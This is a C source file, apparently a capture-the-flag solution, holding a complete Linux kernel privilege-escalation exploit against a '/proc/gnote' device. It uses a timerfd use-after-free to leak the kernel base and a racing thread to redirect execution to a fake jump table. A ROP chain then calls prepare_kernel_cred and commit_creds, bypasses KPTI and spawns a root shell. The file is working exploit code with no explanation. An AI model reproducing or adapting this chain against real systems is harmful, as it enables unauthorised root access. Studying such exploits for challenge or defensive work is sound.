// gcc -o exploit exploit.c -static -pthread -Wl,--section-start=.note.gnu.build-id=0x40200200

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>


#define DEV_PATH "/proc/gnote"
#define ulong unsigned long
#define scu static const unsigned long

#define FAKE_ADDR "0x8000200"

ulong user_cs,user_ss,user_rsp,user_rflags;


void root_shell(void) {
  puts("[+] spawning root shell...");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}

void fatal(char* msg) {
  printf("Err: %s\n", msg);
  exit(-1);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void* swap_rbx(void* arg) {
    asm volatile("mov $" FAKE_ADDR ", %%eax\n"
                 "mov %0, %%rbx\n"
                 "lbl:\n"
                 "xchg (%%rbx), %%eax\n"
                 "jmp lbl\n"
                 :
                 : "r" (arg)
                 : "rax", "rbx", "memory"
                 );
    return 0;
}

int main() {
  char buf[0x100] = {};
  // for leak timerfd_tmrproc
  struct itimerspec timespec = { {0, 0}, {100, 0}};
  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  // kmalloc(0x100, GFP_KERNEL)
  unsigned add[2] = {0x1, 0x100};
  // select
  unsigned select[2] = {0x5,0x0};

  int fd = open(DEV_PATH, O_RDWR);
  if (fd == -1)
    fatal(DEV_PATH);

  /* kbase leak  with UAF */
  puts("[+] allocate timerfd");
  // alloc timerfd
  timerfd_settime(tfd, 0, &timespec, 0);
  // kfree timerfd
  puts("[+] free timerfd");
  close(tfd);
  // triger kfree_rcu()
  sleep(1);
  write(fd, add, sizeof(add));
  write(fd, select, sizeof(select));
  read(fd, buf, 0x100);
  /* dump all of buffer
  for(int i=0; i < sizeof(buf); i+=0x8) {
    printf("+0x%x: 0x%016lx\n", i, *(ulong*)&buf[i]);
  }
  */
  ulong timerfd_tmrproc = *(ulong*)&buf[0x28];
  printf("[i] timerfd_tmrproc: 0x%016lx\n", timerfd_tmrproc);
  ulong kbase = timerfd_tmrproc - 0x15a2f0;
  printf("[i] kbase: 0x%016lx\n", kbase);

  /* making fake jmptable */
  ulong map_size = 0x1000000;
  unsigned long long *table = mmap((void*)0x10000, map_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  printf("[i] fake jmptable mapped: %p - %p\n", table, table + map_size);
  // writing stack pivot gadget for ROP
  puts("[+] writing stack pivot gadget at fake jmptables");
  ulong rop_xchg_esp_eax_ret = kbase + 0x01992a;
  for (int i = 0x98/8; i < map_size / 8; i+=0x1000/8) {
    table[i] = rop_xchg_esp_eax_ret;
  }
  /* making fake stack */
  ulong* fake_stack = (ulong*)(rop_xchg_esp_eax_ret&0xffffffff);
  mmap((void*)(((unsigned long)fake_stack&~0xfff)-0x10000), 0x20000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  printf("[i] root_shell func: %p\n", &root_shell);
  // save userland state
  save_state();
  puts("[+] userland state saved");
  /* ROP chain */
  ulong rop_pop_rdi_ret = kbase + 0x01c20d;
  ulong rop_mov_rdi_rax_rep_prdi_prsi_pop_rbp_ret = kbase + 0x018eef;
  ulong rop_bypass_kpti = kbase + 0x600a4a;
  ulong rop_crash = 0xdeadbeefcafebabe;
  ulong commit_creds = kbase + 0x069df0;
  ulong prepare_kernel_cred = kbase + 0x069fe0;

  unsigned long *chain = fake_stack;
  *chain++ = rop_pop_rdi_ret;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_mov_rdi_rax_rep_prdi_prsi_pop_rbp_ret;
  *chain++ = 0xdeadbeef;// for rbp
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xcafebabe;
  *chain++ = 0xcafebabe;
  *chain++ = (ulong)&root_shell;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;


  /* swap rdx using multi thread & jump fake jmptable */
  unsigned mal_switch[2] = {0x0,0x10001};
  pthread_t th;
  pthread_create(&th, 0, swap_rbx, &mal_switch[0]);
  while (1) {
    write(fd, mal_switch, sizeof(mal_switch));
  }

  return 0;
}
